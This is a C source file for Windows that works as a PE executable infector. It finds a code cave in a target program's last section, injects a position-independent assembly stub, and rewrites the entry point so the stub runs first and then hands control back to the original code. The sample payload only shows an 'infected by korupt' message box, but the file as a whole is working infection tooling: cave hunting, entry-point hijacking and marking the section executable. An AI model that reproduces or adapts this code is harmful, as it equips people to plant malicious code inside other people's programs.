#include <windows.h>
#include <stdio.h>

// fucking gcc wont let us use __declspec(naked)
// so we have to fudge around this with assembler hacks
void realStubStart();
void realStubEnd();


void StubStart()
{

    __asm__(
        ".intel_syntax noprefix\n"			  // att syntax sucks
        ".globl _realStubStart\n"
        "_realStubStart:\n\t"				   // _realStubStart is global --^

        "pusha\n\t"							 // preserve our thread context
        "call GetBasePointer\n"
        "GetBasePointer:\n\t"
        "pop ebp\n\t"
        "sub ebp, offset GetBasePointer\n\t"	// delta offset trick. Think relative...

        "push 0\n\t"
        "lea eax, [ebp+szTitle]\n\t"
        "push eax\n\t"
        "lea eax, [ebp+szText]\n\t"
        "push eax\n\t"
        "push 0\n\t"
        "mov eax, 0xCCCCCCCC\n\t"
        "call eax\n\t"

        "popa\n\t"							  // restore our thread context
        "push 0xCCCCCCCC\n\t"				   // push address of orignal entrypoint(place holder)
        "ret\n"								 // retn used as jmp

        // i dont know about you but i like GCC;'s method of strings
        // over MSVC :P
        "szTitle: .string \"o hi\"\n"
        "szText: .string \"infected by korupt\"\n"

        ".globl _realStubEnd\n"
        "_realStubEnd:\n\t"

        ".att_syntax\n" // fix so the rest of gcc doesnt burp
    );
}

// By Napalm
DWORD FileToVA(DWORD dwFileAddr, PIMAGE_NT_HEADERS pNtHeaders)
{
    WORD wSections;
    PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
    for (wSections = 0; wSections < pNtHeaders->FileHeader.NumberOfSections; wSections++)
    {
        if (dwFileAddr >= lpSecHdr->PointerToRawData)
        {
            if (dwFileAddr < (lpSecHdr->PointerToRawData + lpSecHdr->SizeOfRawData))
            {
                dwFileAddr -= lpSecHdr->PointerToRawData;
                dwFileAddr += (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress);
                return dwFileAddr;
            }
        }

        lpSecHdr++;
    }

    return 0;
}

int main(int argc, char* argv[])
{
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeaders;
    PIMAGE_SECTION_HEADER pSection, pSectionHeader;
    HANDLE hFile, hFileMap;
    HMODULE hUser32;
    LPBYTE hMap;

    int i = 0, charcounter = 0;
    DWORD oepRva = 0, oep = 0, fsize = 0, writeOffset = 0, oepOffset = 0, callOffset = 0;
    unsigned char *stub;

    // work out stub size
    DWORD start = (DWORD)realStubStart;
    DWORD end = (DWORD)realStubEnd;
    DWORD stubLength = (end - start);

    if (argc != 2)
    {
        printf("Usage: %s [file]\n", argv[0]);
        return 0;
    }

    // map file
    hFile = CreateFile(argv[1], GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Cannot open %s\n", argv[1]);
        return 0;
    }

    fsize = GetFileSize(hFile, 0);
    if (!fsize)
    {
        printf("[-] Could not get files size\n");
        CloseHandle(hFile);
        return 0;
    }

    hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, fsize, NULL);
    if (!hFileMap)
    {
        printf("[-] CreateFileMapping failed\n");
        CloseHandle(hFile);
        return 0;
    }

    hMap = (LPBYTE)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, fsize);
    if (!hMap)
    {
        printf("[-] MapViewOfFile failed\n");
        CloseHandle(hFileMap);
        CloseHandle(hFile);
        return 0;
    }

    // check signatures
    pDosHeader = (PIMAGE_DOS_HEADER)hMap;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("[-] DOS signature not found\n");
        goto cleanup;
    }

    pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hMap + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] NT signature not found\n");
        goto cleanup;
    }


    // korupt you need to tdo this more often fuck argh
    if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
    {
        printf("[-] Not an i386 executable\n");
        goto cleanup;
    }

     // get last section's header...
    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)hMap + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    pSection = pSectionHeader;
    pSection += (pNtHeaders->FileHeader.NumberOfSections - 1);

    // save entrypoint
    oep = oepRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    oep += (pSectionHeader->PointerToRawData) - (pSectionHeader->VirtualAddress);

    // locate free space
    i = pSection->PointerToRawData;
    for (; i != fsize; i++)
    {
        if ((BYTE)hMap[i] == 0x00)
        {
            if (charcounter++ == stubLength + 24)
            {
                printf("[+] Code cave located @ 0x%08X\n", i);
                writeOffset = i;
            }
        }
        else charcounter = 0;
    }

    if (charcounter == 0 || writeOffset == 0)
    {
        printf("[-] Could not locate a big enough code cave\n");
        goto cleanup;
    }

    writeOffset -= stubLength;

    stub = (unsigned char *)malloc(stubLength + 1);
    if (!stub)
    {
        printf("[-] Error allocating sufficent memory for code\n");
        goto cleanup;
    }

    // copy stub into a buffer
    memcpy(stub, realStubStart, stubLength);

    // locate offsets of place holders in code
    for (i = 0, charcounter = 0; i != stubLength; i++)
    {
        if (stub[i] == 0xCC)
        {
            charcounter++;
            if (charcounter == 4 && callOffset == 0)
                callOffset = i - 3;
            else if (charcounter == 4 && oepOffset == 0)
                oepOffset = i - 3;
        }
        else charcounter = 0;
    }

    // check they're valid
    if (oepOffset == 0 || callOffset == 0)
    {
        free(stub);
        goto cleanup;
    }

    hUser32 = LoadLibrary("User32.dll");
    if (!hUser32)
    {
        free(stub);
        printf("[-] Could not load User32.dll");
        goto cleanup;
    }

     // fill in place holders
    *(u_long *)(stub + oepOffset) = (oepRva + pNtHeaders->OptionalHeader.ImageBase);
    *(u_long *)(stub + callOffset) = ((DWORD)GetProcAddress(hUser32, "MessageBoxA"));
    FreeLibrary(hUser32);

    // write stub
    memcpy((PBYTE)hMap + writeOffset, stub, stubLength);

    // set entrypoint
    pNtHeaders->OptionalHeader.AddressOfEntryPoint =
        FileToVA(writeOffset, pNtHeaders) - pNtHeaders->OptionalHeader.ImageBase;

    // set section size
    pSection->Misc.VirtualSize += stubLength;
    pSection->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

    // cleanup
    printf("[+] Stub written!!\n[*] Cleaning up\n");
    free(stub);

cleanup:
    FlushViewOfFile(hMap, 0);
    UnmapViewOfFile(hMap);

    SetFilePointer(hFile, fsize, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    CloseHandle(hFileMap);
    CloseHandle(hFile);
    return 0;
}
